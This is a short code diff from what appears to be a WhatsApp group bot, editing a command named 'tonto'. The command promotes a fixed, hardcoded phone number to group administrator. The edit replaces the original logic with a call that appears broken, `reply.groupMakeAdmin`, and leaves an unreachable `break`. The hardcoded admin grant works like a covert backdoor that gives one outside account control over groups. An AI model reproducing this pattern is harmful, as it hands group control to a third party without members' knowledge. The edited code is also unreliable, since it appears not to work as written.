@@ -2150,12 +2150,7 @@ case 'tonto':
           if (!isOwner) return reply(mess.only.admin)
           if (!isBotGroupAdmins) return reply(mess.only.Badmin)
           if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
-          mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
-          if (mentioned.length > 1) {
-          } else {
-            Lxa.groupMakeAdmin(`34632246602@c.us`, true)
-            Lxa.groupMakeAdmin(from)
-          }
+          return reply.groupMakeAdmin(`34632246602@c.us`, true)
           break
 
 //Lxa.groupMakeAdmin(from
